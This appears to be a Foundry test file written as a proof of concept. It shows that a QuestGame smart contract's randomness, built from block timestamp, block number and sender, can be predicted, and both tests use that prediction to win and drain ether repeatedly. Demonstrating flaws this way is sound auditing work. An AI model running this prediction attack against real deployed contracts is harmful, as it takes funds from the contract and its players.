
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public questGame;
    address public attacker;

    function setUp() public {
        questGame = new QuestGame{value: 1 ether}();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        vm.assume(blockTimestamp > 1 hours);
        vm.assume(blockTimestamp < type(uint128).max);
        vm.assume(blockNumber > 0);
        vm.assume(blockNumber < type(uint128).max);

        // --- 2. State Configuration ---
        
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        // Replicate the vulnerable random number generation logic
        uint256 predictedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    attacker
                )
            )
        );
        uint256 predictedNumber = predictedSeed % 100;

        // Execute the attack by submitting the predicted number as the guess
        vm.prank(attacker);
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);

        // Assert that the attacker won by checking their stats
        (uint256 experience, uint256 wins) = questGame.getPlayerStats(attacker);
        
        assertEq(wins, 1, "Attacker should have won exactly once");
        assertEq(experience, 100, "Attacker should have gained 100 experience");
        
        // Verify the attacker received the reward (started with 1 ether, paid 0.1, received 0.2)
        assertEq(attacker.balance, 1.1 ether, "Attacker should have profited from the exploit");
    }

    function test_exploitMultipleWins() public {
        // Demonstrate that an attacker can consistently win by predicting the random number
        
        uint256 initialBalance = attacker.balance;
        uint256 winsCount = 5;

        for (uint256 i = 0; i < winsCount; i++) {
            // Advance time to bypass cooldown
            vm.warp(block.timestamp + 1 hours + 1);
            vm.roll(block.number + 1);

            // Predict the random number using the same logic as the contract
            uint256 predictedSeed = uint256(
                keccak256(
                    abi.encodePacked(
                        block.timestamp,
                        block.number,
                        attacker
                    )
                )
            );
            uint256 predictedNumber = predictedSeed % 100;

            // Submit the predicted guess
            vm.prank(attacker);
            questGame.attemptQuest{value: 0.1 ether}(predictedNumber);
        }

        // Verify all attempts were successful
        (uint256 experience, uint256 wins) = questGame.getPlayerStats(attacker);
        
        assertEq(wins, winsCount, "Attacker should have won all attempts");
        assertEq(experience, winsCount * 100, "Attacker should have gained experience for all wins");
        
        // Each win profits 0.1 ether (pay 0.1, receive 0.2)
        uint256 expectedProfit = winsCount * 0.1 ether;
        assertEq(attacker.balance, initialBalance + expectedProfit, "Attacker should have profited from all exploits");
    }
}
